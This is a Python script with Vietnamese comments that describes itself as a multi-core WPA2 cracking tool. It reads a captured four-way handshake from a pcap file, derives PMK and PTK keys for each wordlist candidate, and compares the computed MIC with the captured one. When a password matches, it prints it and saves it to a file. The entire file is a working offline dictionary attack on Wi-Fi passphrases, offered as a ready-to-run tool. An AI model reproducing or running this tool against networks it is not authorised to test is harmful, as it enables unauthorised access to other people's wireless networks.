import sys
import os
import time
import struct
import binascii
import hashlib
import hmac
import multiprocessing

# Chỉ import Scapy khi cần thiết và xử lý lỗi nếu chưa cài
try:
    from scapy.all import rdpcap, EAPOL, Dot11
except ImportError:
    print("[!] Lỗi: Chưa cài thư viện Scapy.")
    print("    Vui lòng chạy lệnh: pip install scapy")
    input("    Nhấn Enter để thoát...")
    sys.exit()

# ==========================================
# PHẦN 1: CÁC HÀM XỬ LÝ MÃ HÓA (CORE)
# ==========================================
# Lưu ý: Các hàm này chạy độc lập, không phụ thuộc Scapy

def derive_pmk(passphrase: str, ssid: str) -> bytes:
    # PBKDF2: 4096 rounds - Đây là phần tốn CPU nhất
    return hashlib.pbkdf2_hmac(
        'sha1', 
        passphrase.encode('utf-8'), 
        ssid.encode('utf-8'), 
        4096, 
        32
    )

def prf_512(key: bytes, A: bytes, B: bytes) -> bytes:
    n_bytes = 64
    i = 0
    R = b''
    while len(R) < n_bytes:
        hmacsha1 = hmac.new(key, A + b'\x00' + B + bytes([i]), hashlib.sha1)
        R += hmacsha1.digest()
        i += 1
    return R[:n_bytes]

def calculate_mic(kck: bytes, eapol_payload: bytes) -> bytes:
    # Zero out MIC field (Offset 81, length 16)
    eapol_zeroed = eapol_payload[:81] + (b'\x00' * 16) + eapol_payload[97:]
    mic = hmac.new(kck, eapol_zeroed, hashlib.sha1).digest()[:16]
    return mic

# ==========================================
# PHẦN 2: WORKER (CHẠY TRÊN ĐA NHÂN CPU)
# ==========================================

# Biến toàn cục chỉ tồn tại trong bộ nhớ của Process con
worker_ssid = None
worker_bssid = None
worker_anonces = None
worker_targets = None

def init_worker(ssid, bssid, anonces, targets):
    """Thiết lập dữ liệu cho Process con"""
    global worker_ssid, worker_bssid, worker_anonces, worker_targets
    worker_ssid = ssid
    worker_bssid = bssid
    worker_anonces = anonces
    worker_targets = targets

def check_password_chunk(passwords):
    """Hàm xử lý một danh sách mật khẩu trên 1 nhân CPU"""
    if not worker_bssid:
        return None # Phòng trường hợp lỗi init
        
    try:
        ap_mac_bytes = bytes.fromhex(worker_bssid)
    except Exception:
        return None

    for password in passwords:
        if not password: continue
        
        try:
            # Tính PMK
            pmk = derive_pmk(password, worker_ssid)
            
            # So khớp với từng gói tin bắt được
            for target in worker_targets:
                sta_mac_bytes = bytes.fromhex(target['client'])
                
                for anonce in worker_anonces:
                    # Tạo dữ liệu B để tính PTK
                    B = (min(ap_mac_bytes, sta_mac_bytes) + max(ap_mac_bytes, sta_mac_bytes) +
                         min(anonce, target['snonce']) + max(anonce, target['snonce']))
                    
                    ptk = prf_512(pmk, b"Pairwise key expansion", B)
                    kck = ptk[0:16]
                    mic_calc = calculate_mic(kck, target['payload'])
                    
                    if mic_calc == target['mic_orig']:
                        return (password, mic_calc) # BINGO!
        except Exception:
            continue
            
    return None

# ==========================================
# PHẦN 3: XỬ LÝ FILE PCAP (MAIN PROCESS)
# ==========================================

def extract_clean_eapol_bytes(pkt):
    """Chuyển gói tin Scapy thành bytes thuần để tránh lỗi Pickle khi đa luồng"""
    try:
        if not pkt.haslayer(EAPOL):
            return None
        # SỬA LỖI: Dùng bytes() thay vì raw() để an toàn hơn
        raw_bytes = bytes(pkt[EAPOL])
        eapol_len = struct.unpack('>H', raw_bytes[2:4])[0]
        real_len = 4 + eapol_len
        return raw_bytes[:real_len]
    except Exception:
        return None

def wpa2_dictionary_attack(pcap_path, ssid, bssid_input, wordlist_path):
    # Chuẩn hóa MAC input
    bssid_clean = bssid_input.replace(':', '').replace('-', '').lower()
    
    print("\n" + "="*60)
    print(f"[*] CẤU HÌNH TẤN CÔNG (MULTI-CORE)")
    print(f"[*] Số nhân CPU   : {multiprocessing.cpu_count()}")
    print(f"[*] SSID          : '{ssid}'")
    print(f"[*] BSSID (Target): {bssid_input}")
    print(f"[*] Wordlist      : {os.path.basename(wordlist_path)}")
    print("="*60 + "\n")

    if not os.path.exists(pcap_path):
        print(f"[!] Lỗi: Không tìm thấy file PCAP: {pcap_path}")
        return

    print(f"[*] Đang phân tích file PCAP...")
    try:
        packets = rdpcap(pcap_path)
    except Exception as e:
        print(f"[!] Lỗi khi đọc file PCAP: {e}")
        return

    potential_anonces = set()
    msg2_targets = []

    # --- LỌC GÓI TIN ---
    count = 0
    for pkt in packets:
        if pkt.haslayer(EAPOL):
            try:
                # Lấy địa chỉ MAC source/dest
                if hasattr(pkt[Dot11], 'addr2'):
                    src = pkt[Dot11].addr2.replace(':', '').lower()
                    dst = pkt[Dot11].addr1.replace(':', '').lower()
                else:
                    continue

                clean_eapol = extract_clean_eapol_bytes(pkt)
                if not clean_eapol: continue
                
                key_info = struct.unpack('>H', clean_eapol[5:7])[0]
                nonce = clean_eapol[17:49]
                
                # Case 1: Anonce (Router -> Client)
                if src == bssid_clean:
                    potential_anonces.add(bytes(nonce))

                # Case 2: Msg2 (Client -> Router, có MIC)
                elif dst == bssid_clean and (key_info & 0x0100): # Check MIC bit
                     if int.from_bytes(nonce, 'big') == 0: continue 
                     msg2_targets.append({
                        'client': src,
                        'snonce': nonce,
                        'mic_orig': clean_eapol[81:97],
                        'payload': clean_eapol
                    })
                count += 1
            except Exception:
                continue
    
    if not msg2_targets:
        print("[-] LỖI: Không tìm thấy gói handshake Message 2 (Client -> Router).")
        print(f"    Hãy kiểm tra lại MAC Router: {bssid_clean}")
        return
    if not potential_anonces:
        print("[-] LỖI: Không tìm thấy gói handshake Message 1 (Router -> Client/Anonce).")
        return

    print(f"[+] Tìm thấy: {len(potential_anonces)} Anonce và {len(msg2_targets)} gói Message 2.")
    
    if not os.path.exists(wordlist_path):
        print(f"[!] Lỗi: Không tìm thấy file Wordlist: {wordlist_path}")
        return

    # --- CHẠY ĐA LUỒNG ---
    print(f"[*] Đang khởi tạo các tiến trình con...")
    
    CHUNK_SIZE = 2000 # Số password gửi mỗi lần
    pool = multiprocessing.Pool(
        processes=multiprocessing.cpu_count(),
        initializer=init_worker,
        initargs=(ssid, bssid_clean, potential_anonces, msg2_targets)
    )

    start_time = time.time()
    pass_count = 0
    found_result = None

    try:
        # Generator đọc file để tiết kiệm RAM
        def file_reader_generator(path, size):
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                batch = []
                for line in f:
                    clean_line = line.strip('\n\r')
                    if clean_line:
                        batch.append(clean_line)
                    if len(batch) >= size:
                        yield batch
                        batch = []
                if batch: yield batch

        print(f"[*] Bắt đầu CRACK (Nhấn Ctrl+C để dừng)...")
        
        # imap_unordered giúp lấy kết quả ngay khi có worker làm xong
        for result in pool.imap_unordered(check_password_chunk, file_reader_generator(wordlist_path, CHUNK_SIZE)):
            pass_count += CHUNK_SIZE
            
            # Hiển thị tiến độ (ghi đè dòng cũ)
            sys.stdout.write(f"\r >> Đã thử: {pass_count:,} mật khẩu...")
            sys.stdout.flush()

            if result: # Nếu tìm thấy
                found_result = result
                pool.terminate() # Kill các worker khác ngay lập tức
                break

    except KeyboardInterrupt:
        print("\n\n[!] Đang dừng hệ thống...")
        pool.terminate()
        pool.join()
        sys.exit()
    except Exception as e:
        print(f"\n\n[!] LỖI RUNTIME: {e}")
        pool.terminate()
        sys.exit()

    pool.close()
    pool.join()

    # --- KẾT QUẢ ---
    if found_result:
        password_found, mic_found = found_result
        total_time = time.time() - start_time
        speed = int(pass_count / total_time) if total_time > 0 else 0
        
        print(f"\n\n{'='*60}")
        print(f">>> CRACK THÀNH CÔNG! <<<")
        print(f"{'='*60}")
        print(f"[+] MẬT KHẨU      : {password_found}")
        print(f"[+] Thời gian     : {total_time:.2f} giây")
        print(f"[+] Tốc độ        : ~{speed} pass/giây")
        print(f"[+] MIC Check     : {binascii.hexlify(mic_found).decode()}")
        print(f"{'='*60}")
        
        # Lưu kết quả ra file
        with open("cracked_wifi.txt", "a", encoding="utf-8") as f:
            f.write(f"SSID: {ssid} | Pass: {password_found}\n")
        print(f"[*] Đã lưu vào file 'cracked_wifi.txt'")
    else:
        print(f"\n\n[-] KHÔNG TÌM THẤY mật khẩu trong wordlist này.")

if __name__ == "__main__":
    # Dòng này cực kỳ quan trọng trên Windows để chạy đa luồng
    multiprocessing.freeze_support()
    
    try:
        # Nếu chạy trực tiếp thì xóa màn hình cho đẹp
        if os.name == 'nt': os.system('cls')
        else: os.system('clear')
        
        print("--- TOOL CRACK WPA2 (MULTI-CORE FIXED) ---")
        pcap_in = input("File .cap       : ").strip().strip('"').strip("'")
        ssid_in = input("SSID (Tên Wifi) : ") 
        mac_in  = input("MAC Router      : ").strip()
        word_in = input("File Wordlist   : ").strip().strip('"').strip("'")
        
        wpa2_dictionary_attack(pcap_in, ssid_in, mac_in, word_in)
        
        input("\nNhấn Enter để thoát...")
    except KeyboardInterrupt:
        print("\n[!] Thoát.")